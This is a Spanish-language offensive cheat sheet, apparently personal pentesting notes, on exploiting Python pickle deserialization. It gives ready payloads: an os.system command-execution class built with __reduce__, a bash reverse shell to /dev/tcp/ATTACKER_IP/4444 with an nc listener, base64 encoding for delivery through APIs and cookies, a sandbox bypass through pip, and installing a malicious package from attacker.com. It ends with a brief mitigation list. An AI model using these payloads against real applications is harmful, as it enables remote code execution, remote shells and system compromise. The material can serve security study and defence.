
## 📚 Índice


- [[#📌 ¿Qué es un ataque DES-Pickle?]]
- [[#🎯 Impacto del ataque]]
- [[#🧠 Modelo mental (clave para entender Pickle)]]
- [[#🧬 Ejemplo básico de funcionamiento interno]]
- [[#🚨 Vulnerabilidad crítica: ejecución automática]]
- [[#🧪 Payload básico de ejecución de comandos]]
- [[#🔁 Conversión a Base64 (común en APIs)]]
- [[#🔥 Reverse Shell con Pickle (laboratorio)]]
- [[#🧩 Compatibilidad Python 2 / Python 3]]
- [[#🧱 Pickle Sandbox Bypass (concepto)]]
- [[#📦 Uso de paquetes instalados por defecto]]
- [[#🧨 Ejemplo: importar pip desde Pickle]]
- [[#🧬 Ataque avanzado: instalación de paquetes maliciosos]]
- [[#🧨 Flujo típico del ataque]]
- [[#🛡️ Medidas de mitigación (defensivo)]]
- [[#🧠 Resumen rápido]]
- [[#📚 Recursos útiles]]

---
## 📌 ¿Qué es un ataque DES-Pickle?

Un **Ataque de Deserialización Pickle (DES-Pickle)** ocurre cuando una aplicación Python utiliza `pickle.loads()` sobre datos **controlados por el usuario**.

📦 `pickle` **no solo serializa datos**, también puede serializar:

- funciones
    
- clases
    
- llamadas del sistema
    
- objetos ejecutables
    

👉 Esto provoca que **al deserializar se ejecute código automáticamente**, lo que convierte el bug en un **RCE directo**.

---

## 🎯 Impacto del ataque

Si un atacante controla el contenido que llega a `pickle.loads()`:

- ✅ Ejecución remota de comandos (RCE)
    
- ✅ Acceso al sistema
    
- ✅ Lectura / modificación de datos sensibles
    
- ✅ Reverse shell
    
- ✅ Denegación de servicio (DoS)
    
- ✅ Escalada completa si el proceso corre con privilegios
    

⚠️ **Una sola línea vulnerable basta:**

```python
pickle.loads(data)
```

Eso ya es **RCE automático**.

---

## 🧠 Modelo mental (clave para entender Pickle)

Cuando Python deserializa un objeto:

1. Reconstruye el objeto
    
2. Ejecuta el método especial `__reduce__()`
    
3. El valor retornado define:
    
    - qué función se ejecuta
        
    - con qué argumentos
        

👉 Si controlas `__reduce__`, controlas la ejecución.

---

## 🧬 Ejemplo básico de funcionamiento interno

```python
def __reduce__(self):
    return (funcion, (argumentos,))
```

Durante `pickle.loads()` Python ejecuta:

```python
funcion(*argumentos)
```

---

# 🚨 Vulnerabilidad crítica: ejecución automática

Si ves esto en código:

```python
pickle.loads(data)
```

➡️ **Eso equivale a RCE directo.**

No hay validación.  
No hay sandbox.  
No hay confirmación.

---

# 🧪 Payload básico de ejecución de comandos

## ✔️ Payload mínimo (ejecutar `id`)

```python
import pickle
import os

class RCE(object):
    def __reduce__(self):
        return (os.system, ("id",))

print(pickle.dumps(RCE()))
```

---

## 🔁 Conversión a Base64 (común en APIs)

```bash
python3 exploit.py | base64
```

Esto se usa cuando:

- el backend espera texto
    
- JSON
    
- cookies
    
- parámetros POST
    

---

# 🔥 Reverse Shell con Pickle (laboratorio)

## Payload de reverse shell con `bash`

```python
import pickle
import subprocess

class X(object):
    def __reduce__(self):
        cmd = ("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",)
        return (subprocess.call, cmd)

print(pickle.dumps(X()))
```

📌 Luego:

```bash
nc -lvnp 4444
```

---

# 🧩 Compatibilidad Python 2 / Python 3

Si el servidor usa **Python 2**, debes generar el pickle compatible:

```python
pickle.dumps(P(), 2)
```

Ejemplo completo:

```python
print(base64.b64encode(pickle.dumps(P(), 2)))
```

---

# 🧱 Pickle Sandbox Bypass (concepto)

Algunos entornos intentan “aislar” Pickle, pero:

> ❌ Pickle puede importar librerías automáticamente  
> ✅ Incluso si no están cargadas previamente

Esto permite **bypass del sandbox** usando paquetes ya instalados.

---

# 📦 Uso de paquetes instalados por defecto

Los entornos Python suelen traer paquetes preinstalados.

📄 Lista de referencia:  
[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)

Pickle puede importar cualquiera de ellos.

---

## 🧨 Ejemplo: importar `pip` desde Pickle

```python
import pickle, pip

class P(object):
    def __reduce__(self):
        return (pip.main, (["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```

📌 Aunque `pip` no esté importado antes, **pickle lo carga automáticamente**.

---

# 🧬 Ataque avanzado: instalación de paquetes maliciosos

Si el entorno permite `pip`, puedes:

```python
pip.main(["install", "http://attacker.com/reverse.tar.gz"])
```

Esto permite:

- instalar paquetes arbitrarios
    
- ejecutar código en `setup.py`
    
- obtener reverse shell
    

---

## 🧨 Flujo típico del ataque

1. App recibe input serializado
    
2. Usa `pickle.loads(data)`
    
3. Atacante inyecta payload
    
4. `__reduce__()` se ejecuta
    
5. Se llama a funciones del sistema
    
6. RCE conseguido
    

---

# 🛡️ Medidas de mitigación (defensivo)

✅ **Nunca usar `pickle.loads()` con datos externos**

Alternativas seguras:

- `json`
    
- `yaml.safe_load`
    
- `msgpack`
    
- serializadores tipados
    

Medidas adicionales:

- eliminar deserialización automática
    
- sandbox fuerte
    
- ejecutar con usuario sin privilegios
    
- limitar imports
    
- bloquear ejecución de comandos
    
- usar AppArmor / SELinux
    

---

# 🧠 Resumen rápido

|Elemento|Riesgo|
|---|---|
|`pickle.loads()`|🔥 RCE directo|
|`__reduce__()`|punto crítico|
|input controlado|compromiso total|
|sandbox débil|bypass trivial|
|pip disponible|instalación de malware|
|base64|vector común|
|Python2/3|afecta ambos|

---

# 📚 Recursos útiles

- HackTricks – Pickle:  
    [https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)
    
- Sandbox bypass:  
    [https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/)
    
- Pickle internals:  
    [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
    

---

